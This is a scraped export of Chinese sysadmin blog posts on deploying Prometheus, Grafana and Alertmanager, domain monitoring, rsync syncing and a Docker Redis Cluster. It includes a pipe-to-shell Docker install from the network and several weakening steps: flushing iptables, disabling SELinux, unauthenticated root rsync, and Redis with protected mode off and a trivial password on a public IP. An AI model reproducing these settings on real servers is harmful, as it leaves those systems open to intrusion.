'/etc/alertmanager/template/*.tmpl'....receivers:- name: 'email' #收邮件的邮箱 email_configs: - to: 'yichenxiuops@163.com' #发送邮件的内容（调用模板文件中的） html: '{{ template &quot;email.html&quot; .}}' 重载配置 1curl -X POST http://localhost:9093/-/reload 检查 1http://192.168.224.11:9093/#/status 3、测试163邮件报警，修改前和修改后的区别如下图：","link":"/2023/05/10/Prometheus%E4%BD%BF%E7%94%A8%E9%82%AE%E7%AE%B1%E6%8E%A5%E6%94%B6%E5%91%8A%E8%AD%A6%E9%80%9A%E7%9F%A5/"},{"title":"Prometheus的docker部署搭建","text":"Prometheus的docker部署一、安装docker环境安装docker 镜像加速 123456sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'{&quot;registry-mirrors&quot;: [&quot;http://hub-mirr.c.163.com&quot;]}EOF 安装docker 12345export DOWNLOAD_URL=&quot;http://mirrors.163.com/docker-ce&quot; curl -fsSL https://get.docker.com | sh systemctl enable dockersystemctl start docker 检查 12345678docker -vsystemctl status docker安装自动补全插件yum install -y bash-completionsource /usr/share/bash-completion/completions/dockersource /usr/share/bash-completion/bash_completion 安装docker-compose 1234curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.2/docker-compose-`uame -s`-`uname -m` &gt; /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-compose或者直接yum install -y docker-compose 检查 1docker-compose -v 二、docker-compose安装prometheus1、手动创建docker-compose和配置文件创建prometheus监控文件夹123mkdir /data/docker-prometheus -pmkdir /data/docker-prometheus/{grafana,prometheus,alertmanager} -pcd /data/docker-prometheus/ 创建alertmanager配置文件12345678910111213141516171819202122232425262728293031323334353637vim alertmanager/config.ymls#通过 set paste 方式粘贴global: #163服务器 smtp_smarthost: 'smtp.163.com:465' #发邮件的邮箱 smtp_from: 'test1@163.com' #发邮件的邮箱用户名，也就是你的邮箱 smtp_auth_username: 'test1@163.com' #发邮件的邮箱密码 smtp_auth_password: 'your-password' #进行tls验证 smtp_require_tls: falseroute: group_by: ['alertname'] # 当收到告警的时候，等待group_wait配置的时间，看是否还有告警，如果有就一起发出去 group_wait: 10s # 如果上次告警信息发送成功，此时又来了一个新的告警数据，则需要等待group_interval配置的时间才可以发送出去 group_interval: 10s # 如果上次告警信息发送成功，且问题没有解决，则等待 repeat_interval配置的时间再次发送告警数据 repeat_interval: 10m # 全局报警组，这个参数是必选的 receiver: emailreceivers:- name: 'email' #收邮件的邮箱 email_configs: - to: 'test1@163.com'inhibit_rules: - source_match: severity: 'critical' target_match: severity: 'warning' equal: ['alertname', 'dev', 'instance'] 新建grafana的配置文件1234vim grafana/config.monitoringGF_SECURITY_ADMIN_PASSWORD=passwordGF_USERS_ALLOW_SIGN_UP=false 新建prometheus的配置文件123456789101112131415161718192021222324252627282930313233343536373839404142vim prometheus/prometheus.yml#通过 set paste 方式粘贴# 全局配置global: scrape_interval: 15s # 将搜刮间隔设置为每15秒一次。默认是每1分钟一次。 evaluation_interval: 15s # 每15秒评估一次规则。默认是每1分钟一次。# Alertmanager 配置alerting: alertmanagers: - static_configs: - targets: ['alertmanager:9093']# 报警(触发器)配置rule_files: - &quot;alert.yml&quot;# 搜刮配置scrape_configs: - job_name: 'prometheus' # 覆盖全局默认值，每15秒从该作业中刮取一次目标 scrape_interval: 15s static_configs: - targets: ['localhost:9090'] - job_name: 'alertmanager' scrape_interval: 15s static_configs: - targets: ['alertmanager:9093'] - job_name: 'cadvisor' scrape_interval: 15s static_configs: - targets: ['cadvisor:8080'] labels: instance: Prometheus服务器 - job_name: 'node-exporter' scrape_interval: 15s static_configs: - targets: ['node_exporter:9100'] labels: instance: Prometheus服务器 创建alert报警文件1234567891011121314vim prometheus/alert.ymlgroups:- name: Prometheus alert rules: # 对任何实例超过30秒无法联系的情况发出警报 - alert: 服务告警 expr: up == 0 for: 30s labels: severity: critical annotations: summary: &quot;服务异常,实例:{{ $labels.instance }}&quot; description: &quot;{{ $labels.job }} 服务已关闭&quot; 新建docker-compose.yml文件prometheus docker hub 最新版本查看地址 1https://hub.docker.com/r/prom/prometheus/tags alertmanager docker hub 最新版本查看地址 1https://hub.docker.com/r/prom/alertmanager/tags node-exporter docker hub 最新版本查看地址 1https://hub.docker.com/r/prom/node-exporter/tags 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113vim docker-compose.ymlversion: '3.3'volumes: prometheus_data: {} grafana_data: {}networks: monitoring: driver: bridgeservices: prometheus: image: prom/prometheus:v2.37.6 container_name: prometheus restart: always volumes: - /etc/localtime:/etc/localtime:ro - ./prometheus/:/etc/prometheus/ - prometheus_data:/prometheus command: - '--config.file=/etc/prometheus/prometheus.yml' - '--storage.tsdb.path=/prometheus' - '--web.console.libraries=/usr/share/prometheus/console_libraries' - '--web.console.templates=/usr/share/prometheus/consoles' #热加载配置 - '--web.enable-lifecycle' #api配置 #- '--web.enable-admin-api' #历史数据最大保留时间，默认15天 - '--storage.tsdb.retention.time=30d' networks: - monitoring links: - alertmanager - cadvisor - node_exporter expose: - '9090' ports: - 9090:9090 depends_on: - cadvisor alertmanager: image: prom/alertmanager:v0.25.0 container_name: alertmanager restart: always volumes: - /etc/localtime:/etc/localtime:ro - ./alertmanager/:/etc/alertmanager/ command: - '--config.file=/etc/alertmanager/config.yml' - '--storage.path=/alertmanager' networks: - monitoring expose: - '9093' ports: - 9093:9093 cadvisor: image: google/cadvisor:latest container_name: cadvisor restart: always volumes: - /etc/localtime:/etc/localtime:ro - /:/rootfs:ro - /var/run:/var/run:rw - /sys:/sys:ro - /var/lib/docker/:/var/lib/docker:ro networks: - monitoring expose: - '8080' node_exporter: image: prom/node-exporter:v1.5.0 container_name: node-exporter restart: always volumes: - /etc/localtime:/etc/localtime:ro - /proc:/host/proc:ro - /sys:/host/sys:ro - /:/rootfs:ro command: - '--path.procfs=/host/proc' - '--path.sysfs=/host/sys' - '--collector.filesystem.ignored-mount-points=^/(sys|proc|dev|host|etc|rootfs/var/lib/docker)($$|/)' networks: - monitoring ports: - '9100:9100' grafana: image: grafana/grafana:9.4.3 container_name: grafana restart: always volumes: - /etc/localtime:/etc/localtime:ro - grafana_data:/var/lib/grafana - ./grafana/provisioning/:/etc/grafana/provisioning/ env_file: - ./grafana/config.monitoring networks: - monitoring links: - prometheus ports: - 3000:3000 depends_on: - prometheus 访问 1234http://192.168.224.12:9090/http://192.168.224.12:3000http://192.168.224.12:9093http://192.168.224.12:9100/metrics 各容器及应用Prometheus 采集数据 Grafana 用于图表展示 alertmanager 用于接收 Prometheus发送的告警信息 node-exporter 用于收集操作系统的硬件信息的metrics 三、使用grafana暂时prometheus的图形1、登录Grafana登录Grafana 123http://192.168.224.12:3000用户名: admin密码: password 2、创建Promethus数据源在Grafana中创建Prometheus数据源 1.单击边栏的“齿轮”，打开配置菜单 2.单击数据源 3.单击添加数据源 4.选择”Prometheus”作为类型 5.设置适当的Prometheus服务器URL(例如: http://prometheus:9090) 6.单击保持并测试。 如下图 3、创建仪表盘从Grafana.com导入仪表盘 打开官网。在搜索栏输入node exporter回车，点击下载量最大的 1https://grafana.com/grafana/dashboards/s 复制ID 11860 然后导入仪表盘 填写id 修改名字，确认无误就点击Import导入。 最后效果","link":"/2023/04/26/Prometheus%E7%9A%84docker%E9%83%A8%E7%BD%B2/"},{"title":"Prometheus监控domain域名","text":"一、环境 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker安装的prometheus server2.com 192.168.224.12 Centos7.6 domain_exporter版本1.20.0 1、环境搭建 docker安装略 docker-compose安装略 二、域名过期时间监控域名的监控通过domain_exporter来完成 domain_exporter https://github.com/caarlos0/domain_exporter/releases 1234 ## 1、二进制安装（二选一） https://prometheus.io/download/ 12 wget https://github.com/caarlos0/domain_exporter/releases/download/v1.20.0/domain_exporter_1.20.0_linux_amd64.tar.gz mkdir /usr/local/Prometheus/domain_exporter -p tar zxvf domain_exporter_1.20.0_linux_amd64.tar.gz -C /usr/local/Prometheus/domain_exporter 12### 创建用户 useradd -M -s /usr/sbin/nologin prometheus 12### 更改exporter文件夹权限 chown prometheus:prometheus -R /usr/local/Prometheus 12### 创建systemd cat &lt;&lt;”EOF” &gt;/etc/systemd/system/domain_exporter.service[Unit]Description=domain_exporterAfter=network.target [Service]Type=simpleUser=prometheusGroup=prometheusExecStart=/usr/local/Prometheus/domain_exporter/domain_exporterRestart=on-failure [Install]WantedBy=multi-user.targetEOF 12### 启动 systemctl daemon-reload systemctl start domain_exporter 12### 加入到开机自启动 systemctl enable domain_exporter 12### 检查 systemctl status domain_exporter 12启动不了检查日志 journalctl -u domain_exporter -f 12## 2、docker安装 docker run -d –restart=always –name domain_exporter -p 9222:9222 caarlos0/domain_exporter 12## 3、Prometheus设置 cd /data/docker-prometheus 12使用cat追加 cat &gt;&gt; prometheus/prometheus.yml &lt;&lt;”EOF” job_name: domain#scrape_interval: 1hscrape_interval: 15smetrics_path: /proberelabel_configs: source_labels: [address]target_label: __param_target target_label: addressreplacement: 192.168.224.12:9222 # domain_exporter addressstatic_configs: targets: qq.com baidu.cnEOF12### 重新加载配置 curl -X POST http://localhost:9090/-/reload12### 检查 http://192.168.224.11:9090/targets?search= http://192.168.224.12:9222/ 1234## 4、常用监控项目 domain_expiry_days 域名到期时间domain_probe_success 域名检测状态 1234## 5、触发器Prometheus配置 报警(触发器)配置rule_files: “alert.yml” “rules/*.yml”12### 添加domain触发器（告警规则） cat &gt;&gt; prometheus/rules/domain.yml &lt;&lt;”EOF”groups: name: domainrules: alert: 域名检测失败expr: domain_probe_success == 0for: 2hlabels: severity: warningannotations: summary: ‘‘ description: ‘域名检测失败’ alert: 域名过期expr: domain_expiry_days &lt; 30for: 2hlabels: severity: warningannotations: summary: ‘‘ description: ‘将在30天后过期’ alert: 域名过期expr: domain_expiry_days &lt; 5for: 2hlabels: severity: pageannotations: summary: ‘‘ description: ‘将在5天后过期’EOF12### 重新加载配置 curl -X POST http://localhost:9090/-/reload12### 检查 http://192.168.224.11:9090/alerts?search=123456## 6、Doshboard https://grafana.com/grafana/dashboards/14605 问题处理： 找到右边的Column Styles，在找到“域名”这列，把instance修改为domain 如下图","link":"/2023/05/08/Prometheus%E7%9B%91%E6%8E%A7domain%E5%9F%9F%E5%90%8D/"},{"title":"Rsync文件备份同步","text":"RSync 文件备份同步 什么是rsync？官方文档 1https://download.samba.org/pub/rsync/rsync.1 它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。 rsync 包括如下的一些特性：1.可以镜像保存整个目录树和文件系统2.容易做到保存原有的权限，owner,group,时间(修改时间,modify time)，软硬链接3.传输效率高，使用同步算法，只比较变化的4.支持匿名传输，方便网站镜像 rsync的安装: 1yum install rsync -y 配置文件:rsync的主要有以下三个配置文件，文件默认有的不存在，请手动创建它1.rsyncd.conf(主配置文件)2.rsyncd.secrets(密码文件)3.rsyncd.motd(rysnc服务器信息) rsync 常用选项：-v verbose（冗长模式；显示同步过程）-a 归档模式传输并保持文件属性，包含以下选项 -r 递归 -l 保留软链接 -p 权限 -t 文件修改时间 -g 属组，保留特殊设备文件 -o 属主 -D 等于–devices –specials 表示支持b,c,s,p类型的文件（设备文件）-R 保留相对路径-H 保留硬链接-X 保留扩展属性（特殊权限位，隐藏属性）-A 保留acl权限 rsync命令的普通用法：rsync -av /home/ /backup #本机上的同步，把/home目录下的内容同步到/backup目录下(包括隐藏文件)rsync -av /home/ 192.168.224.10:/backup #把本地的/home目录内容，同步到远端10的/backup目录下 rsync -av 192.168.224.10:/backup/ /backup/ #把远端10的/backup目录下的内容同步到本地的/backup目录（注意：路径写法的区别！原目录后面加不加/也影响你的同步目录；没加/，就是将目录本身同步过去；目录加/，就是将目录里的内容同步过去！） 最简单的目录同步方法：如果远程主机的目录中有一个文件被删除了，可是使用命令将本机目录中内容进行同步！rsync -aHAXv –delete /test/ /test2/ rsync本身不具备控制功能和日志记录功能，需要把rsync做成服务的形式，并加上一些控制功能或日志记录功能。可以使用命令：# man rsyncd.conf 查看如何添加这些功能： 服务器端的配置：1，第一步： 123456vim /etc/rsyncd.confmotd file=/etc/rsyncd.welcome #定义指定的文件路径[test] #参数组名称path=/test #定义同步目录路径 vim /etc/rsyncd.welcome #手动建立自己定义的motd文件，并写上自定义的欢迎信息 1****** ^_^ Welcome to use rsync！^_^ ****** 2，第二步：新增服务启动脚本 1234567891011121314yum install -y xinetdvim /etc/xinetd.d/rsync service rsync{ disable = no #yes改为no 打开rsync服务功能 socket_type = stream wait = no #yes改为no （其他不用管） user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID} 第三步： systemctl restart xinetd #重启服务 netstat -ntlup |grep 873 #服务端就会有873的端口在监听了tcp 0 0 0.0.0.0:873 0.0.0.0:* LISTEN 4080/xinetd 客户端的操作： yum install -y rsync rsync -v 192.168.224.10:: #查看10这个服务器同步路径名 1234****** ^_^ Welcome to use rsync！^_^ ************************************************* #这就是你rsyncd.welcome里写的欢迎内容test #这个就是同步路径名 ​ 1rsync -a 192.168.224.10::test /test1/ 这样同步，是不需要密码的；注意notes为共享路劲名称，语法上在该名称前面有两个“:”！ 没有密码有好处也有坏处，好处是不需要密码方便写脚本做远程同步。如果要密码写脚本就要用到expect自动应答。坏处就是不安全，但你可以使用iptables等来加强安全。 如果同步报permission denied这种错误，可能是服务端selinux没有关闭iptables -F 关闭selinux的方法：1，setenforce 0 –这是马上把selinux由强制模式改成警告模式2, vim /etc/selinux/configSELINUX=disabled –把这个改成disabled，然后需要重启电脑才能生效 rsync配置更加详细功能在上面的基础上加上一些更加强大的功能 要求： 把日志记录到/var/log/rsyncd.log 4种方式，xinetd：log_type(SYSLOG/FILE) rsyncd：log file和syslog facility 共享模块要求隐藏(也就是说客户端查看不到这个模块名（notes）) list 同时只能1个客户端连接进行同步这个module（notes） 2种方式，xinetd：instances rsyncd：max connections 只能允许192.168.224.11(ip你自定义)同步这个module 2种方式，xinetd：only_from rsyncd：hosts allow 123456789101112vim /etc/rsyncd.confmotd file=/etc/rsyncd.welcome[notes] #参数组名称path=/var/www/html #设置rsync同步文件路径list=false #隐藏共享模块名称（notes）max connections=1 #设置同一时间内最大的链接数log file=/var/log/rsyncd.log #设置指定的日志文件路径hosts allow=192.168.224.11 192.168.224.10 192.168.224.0/24 #设置允许的ip或网段 生产环境数据迁移实战 12345678910111213uid = rootgid = rootuse chroot = yesport 873log file = /var/log/rsyncd.log#允许的iphosts allow = 34.96.150.66 [fdfscp] path = /data read only = yes dont compress = *.gz *.bz2 *.tgz *.zip *.rar *.z 检查配置文件是否有格式错误，包括命令注释不能同行 迁移新服务器拉取 1234yum install -y rsync rsync -avz 47.91.247.66::fdfscp /data 把远程的fdfscp组定义的数据目录同步到本地的/data目录下。本地没有data目录，会自动创建。 实时同步实现实时同步（也就是源目录中的内容发生变化，它就会触发同步，实现两边目录中内容完全相同)inotify+rsync 软件名称：inotify-tools安装过程： 1234yum install -y epel-release yum makecache fastyum install -y inotify-tools 安装完后，就会产生下面两个命令inotifywait inotifywait –help-m –monitor #监控-r –recursive #目录和子目录都监控-q –quiet #安静模式，尽可能少输出信息-e –event #监控的事件，access，modify，attrib…… 做测试：测试本机/data目录里一有（增，删，改，属性改变)，就会同步到/data2目录 使用下面的脚本来做 1234567vim /tmp/1.sh#!/bin/bashinotifywait -mrq -e modify,delete,create,attrib,move /data |while read filesdorsync -a --delete /data/ /data2/done 输入以下命令，执行上面写的脚本！nohup sh /tmp/1.sh &amp; 再然后对/data进行各种操作，验证可以实时同步到/data2 实现双向的实时同步也有相关的软件(比如unison)可以专门来做双向的实时同步但我们就可以用inotify反向再做一次再写一个脚本也一样可以简单去实现 使用rsync的secrets file的方法做远程同步例：远程被同步端 本地同步端192.168.224.11 192.168.224.10我要实现把192.168.224.10上的/data/目录里的内容实时同步到192.168.224.11的/data2/目录 实现过程第一大步：在远程被同步端192.168.224.11上操作mkdir /data2/ #创建测试的同步目录 1234567891011121314151617vim /etc/rsyncd.confuid=root gid=root #这里指定使用root身份同步，否则默认使用nobody用户（这样你需要把/data2/目录改成757的权限，才有权限写)[testsource]path=/data2/ignore errors#服务级别给写权限read only=no #验证的用户取名为testauth users=test secrets file=/etc/rsyncd.secrets #验证用户test的用户名和密码的存放文件，此文件需要同步端和被同步端都要有（这样我们就可以用这种方式来进行验证，而不需要远程的ssh密码验证了）hosts allow=192.168.224.10 #进一步加强安全，只允许192.168.224.10同步 vim /etc/rsyncd.secrets 创建这个密码文件，用户名要与上面的auth users指定的一致，密码随意（我这里以321来测试) 1test:321 chmod 600 /etc/rsyncd.secrets #为了安全性，把权限改成600,只让root读写(很多其它软件的密码文件也会要求你改成600权限) vim /etc/xinetd.d/rsync disable = no #disable 后面值由yes改为no systemctl restart xinetd #重启服务chkconfig xinetd on #设置开机自动启动 第二大步:在本地同步端192.168.224.10上操作先安装inotify软件，步骤参照上面过程，这里省略 mkdir /data/ #创建测试的同步目录 vim /etc/rsyncd.secrets #也要创建这个密码文件，里面只写密码就可以了。用户我们在后面的脚本里的命令里指定321chmod 600 /etc/rsyncd.secrets #也改成600的权限 vim /bin/rsync.sh #脚本及其内容 12345#!/bin/bashinotifywait -mrq -e modify,delete,create,attrib,move /data |while read filesdo rsync -a --delete --password-file=/etc/rsyncd.secrets /data/ test@192.168.224.11::testsourcedone chmod 755 /bin/rsync.sh nohup sh /bin/rsync.sh &amp; #挂后台执行 vim /etc/rc.local #加到rc.local里让其开机自动执行nohup sh /bin/rsync.sh &amp; 第三步：测试在192.168.224.10的/data目录中进行任何的操作，然后去192.168.224.11的/testsource目录中查看是否成功同步！","link":"/2020/08/03/RSync_%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD%E5%90%8C%E6%AD%A5/"},{"title":"Redis Cluster集群搭建","text":"Redis Cluster集群搭建集群搭建参考官网: 1https://redis.io/topics/cluster-tutorial redis集群需要至少三个master节点，我这里搭建三个master节点。并且给每个master再搭建一个slave节点，总共6个redis节点，这里用一台服务器部署(多台服务器部署，修改一下ip地址就可以了) 部署6个redis实例，三主三从，搭建集群的步骤如下： 我使用redis6.2.6版本 1 创建redis节点安装目录1mkdir /data/docker-redis-cluster 2 依次创建文件夹，并依次修改配置文件1234创建文件夹 6381-6386mkdir /data/docker-redis-cluster/{6381..6386}复制redis.conf配置文件到6381下。cp redis.conf /data/docker-redis-cluster/6381/ 123456789101112131415161718# 修改配置文件 # 关闭保护模式 用于公网访问protected-mode noport 6381# 开启集群模式cluster-enabled yes# 不改也可以# cluster-config-file nodes-6381.conf# cluster-node-timeout 5000#日志文件 也可以不改默认#pidfile /var/run/redis_6381.pid#此处绑定ip 可以是阿里云内网IP 和本地 ip 可以直接注释掉# bind 127.0.0.1#用于连接主节点密码masterauth 123.Redis#设置redis密码 各个节点请保持密码一致requirepass 123.Redis 分别复制到其他5个文件夹中 1234567 cp redis.conf ../6382/ cp redis.conf ../6383/ cp redis.conf ../6384/ cp redis.conf ../6385/ cp redis.conf ../6386/配置文件的端口分别修改对应的。 3 启动6个docker容器和开通防火墙目前 Redis Cluster 不支持经过 NAT 处理的环境以及重新映射 IP 地址或 TCP 端口的一般环境。 这里容易采坑。不要自作聪明通过端口映射的方式启动容器，后面会导致集群加入不了。官方不支持。 123456789101112131415161718192021222324# 开放防火墙iptables -A INPUT -p tcp -m multiport --dports 6381:6390 -j ACCEPTiptables -A INPUT -p tcp -m multiport --dports 16381:16390 -j ACCEPT#分别启动6个容器1.docker run --name redis1 --network host -v /data/docker-redis-cluster/6381/data:/data -v /data/docker-redis-cluster/6381/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 2.docker run --name redis2 --network host -v /data/docker-redis-cluster/6382/data:/data -v /data/docker-redis-cluster/6382/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 3.docker run --name redis3 --network host -v /data/docker-redis-cluster/6383/data:/data -v /data/docker-redis-cluster/6383/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 4.docker run --name redis4 --network host -v /data/docker-redis-cluster/6384/data:/data -v /data/docker-redis-cluster/6384/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 5.docker run --name redis5 --network host -v /data/docker-redis-cluster/6385/data:/data -v /data/docker-redis-cluster/6385/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 6.docker run --name redis6 --network host -v /data/docker-redis-cluster/6386/data:/data -v /data/docker-redis-cluster/6386/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 也可以编写docker-compose.yml文件启动 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455version: '3'services: redis1: container_name: redis1 image: redis:6.2.6 command: redis-server /usr/local/etc/redis/redis.conf network_mode: &quot;host&quot; volumes: - /data/docker-redis-cluster/6381/data:/data - /data/docker-redis-cluster/6381/redis.conf:/usr/local/etc/redis/redis.conf redis2: container_name: redis2 image: redis:6.2.6 command: redis-server /usr/local/etc/redis/redis.conf network_mode: &quot;host&quot; volumes: - /data/docker-redis-cluster/6382/data:/data - /data/docker-redis-cluster/6382/redis.conf:/usr/local/etc/redis/redis.conf redis3: container_name: redis3 image: redis:6.2.6 command: redis-server /usr/local/etc/redis/redis.conf network_mode: &quot;host&quot; volumes: - /data/docker-redis-cluster/6383/data:/data - /data/docker-redis-cluster/6383/redis.conf:/usr/local/etc/redis/redis.conf redis4: container_name: redis4 image: redis:6.2.6 command: redis-server /usr/local/etc/redis/redis.conf network_mode: &quot;host&quot; volumes: - /data/docker-redis-cluster/6384/data:/data - /data/docker-redis-cluster/6384/redis.conf:/usr/local/etc/redis/redis.conf redis5: container_name: redis5 image: redis:6.2.6 command: redis-server /usr/local/etc/redis/redis.conf network_mode: &quot;host&quot; volumes: - /data/docker-redis-cluster/6385/data:/data - /data/docker-redis-cluster/6385/redis.conf:/usr/local/etc/redis/redis.conf redis6: container_name: redis6 image: redis:6.2.6 command: redis-server /usr/local/etc/redis/redis.conf network_mode: &quot;host&quot; volumes: - /data/docker-redis-cluster/6386/data:/data - /data/docker-redis-cluster/6386/redis.conf:/usr/local/etc/redis/redis.conf docker-compose启动 1docker-compose up -d 4 创建集群12345678910创建集群命令--cluster create --cluster-replicas 1通过redis-cli 客户端命令来创建集群redis-cli --cluster create -a '123.Redis' 122.152.250.233:6381 122.152.250.233:6382 122.152.250.233:6383 122.152.250.233:6384 122.152.250.233:6385 122.152.250.233:6386 --cluster-replicas 1通过进入容器命令来创建docker exec -it redis1 redis-cli --cluster create -a '123.Redis' 122.152.250.233:6381 122.152.250.233:6382 122.152.250.233:6383 122.152.250.233:6384 122.152.250.233:6385 122.152.250.233:6386 --cluster-replicas 1 5 Redis Cluster 集群验证在某台机器上(或)连接集群6381端口的节点 12345普通redis方式：redis-cli -h 122.152.25.233 -c -p 6381 -a 123.Redis # 加参数 -c 可以连接到集群Docker方式：docker exec -it redis1 redis-cli -h 122.152.25.233 -c -p 6381 -a 123.Redis 基础命令 1234info replication 通过这个命令来查看集群效果。cluster nodes 整个集群的信息。每个redis的节点都有一个ID值，此ID值将被此特定的redis实例永久使用，以便实例在集群上下文中具有唯一的名称，每个节点都会记住使用此ID的每个其他节点，而不是通过IP或端口。IP或端口可能会发生变化，但唯一的节点标识符在节点的整个生命周期内都不会改变。我们简单的称这个标识符为节点id。 到此集群就搭建完毕了。 6 集群扩容假设我们近期可能要流量大增，所以需要扩大一组redis，一主一从。注意哈希槽的重新分配。 假设实际工作中新增是两台机器 123456789mkdir /data/docker-redis-cluster/6387mkdir /data/docker-redis-cluster/6388分别复制一份redis.conf文件到对应的目录。修改端口号。7.docker run --name redis7 --network host -v /data/docker-redis-cluster/6387/data:/data -v /data/docker-redis-cluster/6387/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 7.docker run --name redis8 --network host -v /data/docker-redis-cluster/6388/data:/data -v /data/docker-redis-cluster/6388/redis.conf:/usr/local/etc/redis/redis.conf -d redis:6.2.6 redis-server /usr/local/etc/redis/redis.conf 新加入集群 123456789101112131415将新增的6387作为master节点加入集群。redis-cli --cluster add-node ip:6387 ip:6381 #6387要作为master新增节点，而6381是原来集群节点里面的领路人，相当于6387需要找到6381来作为领路人来加入到集群这个组织。docker exec -it redis1 redis-cli --cluster add-node -a '123.Redis' 122.152.250.233:6387 122.152.250.233:6381以下是提示信息:[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered.&gt;&gt;&gt; Send CLUSTER MEET to node 122.152.250.233:6387 to make it join the cluster.注意加入到集群之后，有个问题是它没有获取到槽位#查看是否有槽位docker exec -it redis1 redis-cli --cluster check 122.152.250.233:6381 重新分配槽位 1234567891011命令： redis-cli --cluster reshard 122.152.250.233:6381docker exec -it redis1 redis-cli --cluster reshard -a '123.Redis' 122.152.250.233:6381How many slots do you want to move (from 1 to 16384) 16384除以4 = 4096 What is the receiving node ID? #接收点的id是什么？637f60c94ae1d0049383503bccec0f4b0e7f708e 输入新节点的IDSource node #1: all #注意这里的all最后输入yes 然后再次查看是否分配槽位 1docker exec -it redis1 redis-cli --cluster check 122.152.250.233:6381 -a 123.Redis 但是要注意，我们新加入的这个节点分配了4096个槽位，但是它的槽位部署连续的： 1slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master 分成了三段。是之前上一次的三个主机master都分割点过来凑起来了4096个槽位，并不是4个主机重新从0开始分配哈。 主节点下添加从节点 1234567命令：redis-cli --cluster add-node ip:新slave端口 (空格) ip:新master端口--cluster-slave --cluster-master-id 新主机节点IDdocker exec -it redis1 bashredis-cli -a 123.Redis --cluster add-node 122.152.250.233:6388 122.152.250.233:6387 --cluster-slave --cluster-master-id 637f60c94ae1d0049383503bccec0f4b0e7f708e这个命令的意思就是新节点6388，要加入到6387下作为从节点，--cluster-master-id 表示具体的你要加入到哪个maser节点下面，master节点有节点id. 加入了从机之后我们可以看到： 1redis-cli --cluster check 122.152.250.233:6381 -a 123.Redis 7 集群缩容现在的需求是我们流量高峰过了。为了节省资源所以我们就来把6387和6388这两台机器撤掉。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051先删除从机6388命令：redis-cli --cluster del-node ip:从机端口 从机6388节点IDredis-cli -a 123.Redis --cluster del-node 122.152.25.233:6388 2577b4e7140f8d83eb36a8c8d6ed6fd17de048d2redis-cli -p 6388 -c -a Redis cluster nodes #查看节点ID删除了后。重新分配槽位redis-cli --cluster reshard -a '123.Redis' 122.152.25.233:6381root@look:/data# redis-cli --cluster reshard -a '123.Redis' 122.152.25.233:6381Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.&gt;&gt;&gt; Performing Cluster Check (using node 122.152.25.233:6381)M: 25a77b2ff812e77d11003a705db8b117a251cbca 122.152.25.233:6381 slots:[1365-5460] (4096 slots) master 1 additional replica(s)M: ff548df96b7c21c870c45c1a1c5c4e7d6809020c 122.152.25.233:6382 slots:[6827-10922] (4096 slots) master 1 additional replica(s)S: edef23f4c74af20b35768a5a4b5c7a9e9b8150a1 122.152.25.233:6384 slots: (0 slots) slave replicates dc2da432af01aa6bcb2799a69b1bc1decc4fb408S: 8c804b78e553e5ad75dde8a3809d3417881c5a09 122.152.25.233:6386 slots: (0 slots) slave replicates ff548df96b7c21c870c45c1a1c5c4e7d6809020cM: dc2da432af01aa6bcb2799a69b1bc1decc4fb408 122.152.25.233:6383 slots:[12288-16383] (4096 slots) master 1 additional replica(s)S: 086621222eafbdcea8f86437ad0de4b80f7a4fc3 122.152.25.233:6385 slots: (0 slots) slave replicates 25a77b2ff812e77d11003a705db8b117a251cbcaM: 637f60c94ae1d0049383503bccec0f4b0e7f708e 122.152.25.233:6387 slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master # 这里是4096 slots，下面就选择4096。[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered.How many slots do you want to move (from 1 to 16384)? #4096What is the receiving node ID? 25a77b2ff812e77d11003a705db8b117a251cbca #6381的IDPlease enter all the source node IDs. Type 'all' to use all the nodes as source nodes for the hash slots. Type 'done' once you entered all the source nodes IDs.Source node #1: 637f60c94ae1d0049383503bccec0f4b0e7f708e #这里是6387要删除的节点ID，不是6388的。然后选择done查看节点idredis-cli --cluster check 122.152.25.233:6381 -a 123.Redis# 然后再删除第七个节点 6387 命令：redis-cli --cluster del-node ip:端口 6387节点IDredis-cli -a 123.Redis --cluster del-node 122.152.25.233:6387 637f60c94ae1d0049383503bccec0f4b0e7f708e","link":"/2022/01/14/Redis_Cluster%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"},{"title":"Prometheus监控进程","text":"一、环境 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker安装的prometheus test 192.168.224.12 Centos7.6 安装process-exporter对这台服务器的进程监控 1、环境搭建 docker安装略 docker-compose安装略 二、进程监控1、process exporter功能如果想要对主机的进程进行监控，例如chronyd，sshd等服务进程以及自定义脚本程序运行状态监控。我们使用node exporter就不能实现需求了，此时就需要使用process exporter来做进程状态的监控。 1项目地址：https://github.com/ncabatoff/process-exporter 2、二进制安装（二选一）12345678wget 